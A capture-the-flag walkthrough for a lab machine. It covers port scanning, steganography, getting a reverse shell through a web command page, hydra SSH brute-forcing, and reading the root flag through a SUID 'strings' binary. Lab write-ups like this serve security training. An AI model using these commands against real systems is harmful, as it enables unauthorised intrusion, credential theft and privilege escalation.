
# Jack-of-All-Trades

Jack is a man of a great many talents. The zoo has employed him to capture the penguins 
due to his years of penguin-wrangling experience, but all is not as it seems... We must 
stop him! Can you see through his facade of a forgetful old toymaker and bring this 
lunatic down?

---

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.125.218 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln --min-parallelism 55
```

Select running services with this command:

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

[x] 22/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))

[x] 80/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5 (protocol 2.0)

We're also presennted with a couple of comments in html:

```
|     Comment:
|         <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
|     Comment: 
|_        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
```

First, decode comment #1 as follows:

```bash
$ echo "$COMMENT1" | base64 -d
```

Let's poke around the website. We can see a suspiciously-looking aimge of
dinasaur, called ***stego.jpg***. Download it:

```bash
$ wget http://10.10.125.218:22/assets/stego.jpg -O stego.jpg
```

Let's see what's inside(Supply the password from base64 comment):

```bash
$ steghide extract -sf stego.jpg 

$ cat creds.txt 
```

> Hehe. Gotcha!
> 
> You're on the right path, but wrong image!

What, are you kidding me...

Ok, naviagete to /assets and try another image(Same password):

```bash
$ wget http://10.10.125.218:22/assets/header.jpg -O header.jpg

$ steghide extract -sf header.jpg
```

Boom! We now have cms username and password!

Go to the /recovery.php and use those creds. We're presented with a page that
can run commands, apparently. Lets force it to execute a reverse shell.
Grab one reverse shell here [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). Think, which one is most likely to work.

Setup a listener:

```bash
$ nc -lvnp 8080
```

After snooping around a bit, I found a ***jacks_password_list*** in /home directory.
Let's bruteforce ssh service with it:

```bash
$ hydra -l jack -P jacks_password_list.txt 10.10.125.218 -s 80 ssh -V
```

And there you have it. Login as jack to the machine. We see a user.jpg, grab it:

```bash
$ scp -P 80 jack@10.10.125.218:/home/jack/user.jpg .
```

Open it with an image viewer and here's your "user" flag.

---

## *Rooting the machine*

Locate binaries that have SUID bit set:

```bash
$ find / -type f -perm -u=s 2>/dev/null
```

The ***strings*** binary is quite promising. We can just read the root flag:

```bash
$ strings /root/root.txt
```

